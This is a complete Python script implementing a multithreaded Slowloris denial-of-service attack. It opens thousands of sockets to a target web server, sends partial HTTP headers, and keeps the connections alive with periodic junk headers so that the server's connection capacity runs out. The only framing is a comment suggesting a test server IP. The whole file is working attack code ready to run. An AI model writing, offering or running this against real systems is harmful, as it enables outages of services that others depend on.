import socket
import time
import random
import threading

HOST = "192.168.1.20"  # Change to your test server IP
PORT = 80
SOCKETS_PER_THREAD = 200
THREAD_COUNT = 15
DELAY = 10  # seconds between header keep-alives

def init_socket():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(4)
        s.connect((HOST, PORT))
        s.send(f"GET /?{random.randint(0, 9999)} HTTP/1.1\r\n".encode("utf-8"))
        s.send(f"Host: {HOST}\r\n".encode("utf-8"))
        s.send("User-Agent: SlowlorisThreaded\r\n".encode("utf-8"))
        s.send("Accept-language: en-US,en,q=0.5\r\n".encode("utf-8"))
        return s
    except socket.error:
        return None

def attack_thread(thread_id):
    sockets = []
    print(f"[Thread {thread_id}] Starting...")

    # Open sockets
    for _ in range(SOCKETS_PER_THREAD):
        s = init_socket()
        if s:
            sockets.append(s)

    print(f"[Thread {thread_id}] Opened {len(sockets)} sockets.")

    while True:
        print(f"[Thread {thread_id}] Sending keep-alive headers...")
        for s in list(sockets):
            try:
                s.send(f"X-a: {random.randint(1, 5000)}\r\n".encode("utf-8"))
            except socket.error:
                sockets.remove(s)

        # Reopen dropped sockets
        while len(sockets) < SOCKETS_PER_THREAD:
            s = init_socket()
            if s:
                sockets.append(s)

        time.sleep(DELAY)

# Launch multiple threads
for i in range(THREAD_COUNT):
    t = threading.Thread(target=attack_thread, args=(i,), daemon=True)
    t.start()

# Keep main thread alive
while True:
    time.sleep(60)
